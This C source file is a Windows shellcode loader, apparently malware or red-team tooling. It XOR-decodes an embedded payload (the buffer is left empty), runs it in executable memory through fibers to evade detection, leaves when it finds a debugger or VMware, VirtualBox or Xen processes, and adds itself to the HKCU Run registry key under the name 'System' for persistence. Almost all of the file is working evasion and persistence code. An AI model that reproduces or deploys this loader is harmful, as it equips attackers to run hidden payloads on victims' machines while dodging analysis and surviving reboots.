#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define ANTIDEBUG if (IsDebuggerPresent()) { exit(1); }

unsigned char shellCode[] = {}; // shellcode goes here after being encoded with xor key
unsigned char KEY = 0x5F; // xor key for decoding before being ran in memory

LPVOID mainFiber = NULL;
void decode()
{
    for (int i = 0; i < sizeof(shellCode); i++)
    {
        shellCode[i] ^= KEY;
    }
    printf("[!] SHELLCODE DECODED\n");
}

void WINAPI ShellcodeFiber(LPVOID lpParam)
{
    ((void(*)())lpParam)();
    SwitchToFiber(mainFiber);
}

int load()
{
    // CREATING MEMORY BUFFER TO RUN THE SHELLCODE IN
    LPVOID buffer = VirtualAlloc(NULL, sizeof(shellCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer)
    {
        printf("[!] Allocation Failed\n");
        return 0;
    }
    // DECODING THE SHELLCODE USING XOR
    decode();
    // COPY SHELLCODE TO BUFFER
    memcpy(buffer, shellCode, sizeof(shellCode));

    // CHANGE MEMORY PERMISSIONS 
    DWORD oldProtect;
    if (!VirtualProtect(buffer, sizeof(shellCode), PAGE_EXECUTE_READ, &oldProtect))
    {
        printf("[!] PERMISSION ERROR\n");
        return 0;
    }
    // CONVERTING CURRENT THREAD TO FIBER TO EVADE DETECTION
    mainFiber = ConvertThreadToFiber(NULL);
    if (mainFiber == NULL)
    {
        printf("[!] ERROR\n");
        return 0;
    }
    // CREATES NEW FIBER THAT START EXECUTION
    LPVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)ShellcodeFiber, buffer);
    if (!shellcodeFiber)
    {
        printf("[!] CANNOT CREATE FIBER\n");
        return 0;
    }
    // SWITCH EXECUTION TO THE SHELLCODE FIBER TO RUN THE SHELLCODE
    printf("[!] SWITCHING TO FIBER\n");
    SwitchToFiber(shellcodeFiber);
    printf("[!] FIBER RUNNING\n");
    // DELETE FIBER AFTER EXECUTION
    DeleteFiber(shellcodeFiber);
}
// PERSISTENCE ADDING A REG KEY TO RUN ON STARTUP
void add_run_key()
{
    HKEY hKey;
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "System";
    char exePath[MAX_PATH];

    // GET FULL PATH OF CURRENT EXECUTABLE
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    // OPEN RUN KEY FOR THE CURRENT USER WITH WRITE ACCESS
    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
    {
        // WRITE EXECUTABLE PATH INTO THE RUN KEY TO RUN AT STARTUP
        if (RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) 
        {
            printf("[+] Persistence added to Run key!\n");
        } else 
        {
            printf("[-] Failed to write Run key value\n");
        }
        RegCloseKey(hKey);
    } else 
    {
        printf("[-] Failed to open Run key\n");
    }
}

int is_vm_process_running()
{
        const char* vm_processes[] = {
        "vmtoolsd.exe",       // VMware Tools
        "vmwaretray.exe",     // VMware Tray
        "vboxservice.exe",    // VirtualBox Service
        "vboxtray.exe",       // VirtualBox Tray
        "xenservice.exe"      // Xen
    };
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry))
    {
        do
        {
            for (int i = 0; i < sizeof(vm_processes)/sizeof(vm_processes[0]); i++)
            {
                if (_stricmp(entry.szExeFile, vm_processes[i]) == 0)
                {
                    CloseHandle(snapshot);
                    return 1;
                }
            }
        } while (Process32Next(snapshot, &entry));
        
    }
    CloseHandle(snapshot);
    return 0;
}

int main()
{
    if (is_vm_process_running() == 1)
    {
        printf("[!] WHY ARE YOU TRYING TO RUN THIS IN A VIRTUAL MACHINE\n");
        exit(1);
    }
    if (!IsDebuggerPresent())
    {
        add_run_key();
        Sleep(3000); // DELAY PAYLOAD EXECUTION
        load();
        return 0;
    }
    exit(1);
    return 0;
}